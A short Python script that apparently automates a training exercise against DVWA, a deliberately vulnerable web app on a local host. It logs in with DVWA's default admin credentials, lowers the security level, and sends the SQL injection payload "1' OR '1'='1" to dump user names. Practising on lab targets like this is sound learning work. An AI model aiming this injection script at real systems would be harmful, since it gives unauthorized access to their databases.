import requests

# --- Configuration ---
BASE_URL = "http://192.168.11.128:8888/"  # Change to your DVWA host
LOGIN_URL = f"{BASE_URL}/login.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"

# DVWA credentials (default)
USERNAME = "admin"
PASSWORD = "password"

# SQL injection payload
PAYLOAD = "1' OR '1'='1"

def get_session():
    """Log in to DVWA and return an authenticated session."""
    session = requests.Session()

    # Get CSRF token from login page
    login_page = session.get(LOGIN_URL)
    from html.parser import HTMLParser

    class TokenParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.token = None
        def handle_starttag(self, tag, attrs):
            attrs = dict(attrs)
            if tag == "input" and attrs.get("name") == "user_token":
                self.token = attrs.get("value")

    parser = TokenParser()
    parser.feed(login_page.text)
    token = parser.token

    # POST login credentials
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token,
    }
    session.post(LOGIN_URL, data=login_data)

    # Set DVWA security level to "low" for easier testing
    session.post(f"{BASE_URL}/security.php", data={"security": "low", "seclev_submit": "Submit"})

    return session


def run_sqli(session, payload):
    """Send GET request with SQLi payload and print the response."""
    params = {
        "id": payload,
        "Submit": "Submit",
    }

    print(f"[*] Sending payload: {payload!r}")
    print(f"[*] Target URL: {SQLI_URL}\n")

    response = session.get(SQLI_URL, params=params)

    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Final URL: {response.url}\n")

    # Print relevant portion of the response (look for results)
    if "First name" in response.text:
        # Extract and print rows from the response
        lines = response.text.splitlines()
        for line in lines:
            if any(kw in line for kw in ["First name", "Surname"]):
                # Strip HTML tags for readability
                import re
                clean = re.sub(r"<[^>]+>", "", line).strip()
                if clean:
                    print(clean)
    else:
        print("[-] No results found in response. Check your credentials/URL.")

    return response


if __name__ == "__main__":
    print("=== DVWA SQLi Automation Script ===\n")
    session = get_session()
    print("[+] Logged in successfully.\n")
    run_sqli(session, PAYLOAD)